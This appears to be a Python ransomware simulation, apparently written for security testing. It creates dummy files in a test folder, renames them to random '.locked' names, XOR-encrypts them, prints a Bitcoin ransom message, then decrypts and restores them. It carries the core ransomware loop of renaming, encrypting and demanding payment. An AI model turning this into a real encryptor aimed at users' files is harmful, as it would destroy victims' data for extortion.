import os
import string
import random
import operator
import time

sleep_time = 1

# Define the directory path where dummy files will be created
directory = "C:/Users/timja/Documents/Dev/Python Scripts/BlueTrusty/Ransomware_simulation/testdir"

# Define the extensions of the dummy files to create
extensions = ["txt", "pdf", "png"]

# Define the number of dummy files to create for each extension
num_files_per_extension = 3

# Define the ransomware message to display
ransom_message = "Your files have been encrypted. Please pay 1 Bitcoin to the following address to get the decryption key."
decrypted_message = "Your files have been decrypted."

# Define the ransomware key generator function
def generate_key():
    key = ""
    for i in range(16):
        key += random.choice(string.ascii_letters + string.digits)
    return key

# Generate a random encryption key
encryption_key = generate_key()

# Create the directory if it does not exist
if not os.path.exists(directory):
    os.makedirs(directory)

# Create the dummy files
for extension in extensions:
    for i in range(num_files_per_extension):
        filename = "dummy_" + extension + "_" + str(i+1) + "." + extension
        filepath = os.path.join(directory, filename)
        with open(filepath, "w") as f:
            f.write("This is a dummy file.")

time.sleep(sleep_time)

# Simulate the ransomware attack
original_filenames = {}
for filename in os.listdir(directory):
    
    # Rename the file with unreadable names and extensions
    new_filename = generate_key() + ".locked"
    # Keep track of original filenames
    original_filenames[new_filename] = os.path.splitext(filename)[0] + os.path.splitext(filename)[1]
    os.rename(os.path.join(directory, filename), os.path.join(directory, new_filename))
    
    # Encrypt the file using XOR encryption
    with open(os.path.join(directory, new_filename), "rb") as f:
        filedata = f.read()
    encrypted_data = bytearray()
    for byte in filedata:
        encrypted_data.append(operator.xor(byte, encryption_key.encode()[len(encrypted_data) % 16]))
    with open(os.path.join(directory, new_filename), "wb") as f:
        f.write(encrypted_data)
    
# Display the ransom message
print(ransom_message)

# Print the encryption key
print("Encryption Key:", encryption_key)

time.sleep(sleep_time)

# Simulate the ransomware decryption
for filename in os.listdir(directory):
    # Decrypt the file using XOR encryption
    with open(os.path.join(directory, filename), "rb") as f:
        filedata = f.read()
    decrypted_data = bytearray()
    for byte in filedata:
        decrypted_data.append(operator.xor(byte, encryption_key.encode()[len(decrypted_data) % 16]))
    with open(os.path.join(directory, filename), "wb") as f:
        f.write(decrypted_data)
    
    # Rename the file to the original name
    new_filename = original_filenames[filename]
    os.rename(os.path.join(directory, filename), os.path.join(directory, new_filename))

# Display the message after decryption
print(decrypted_message)
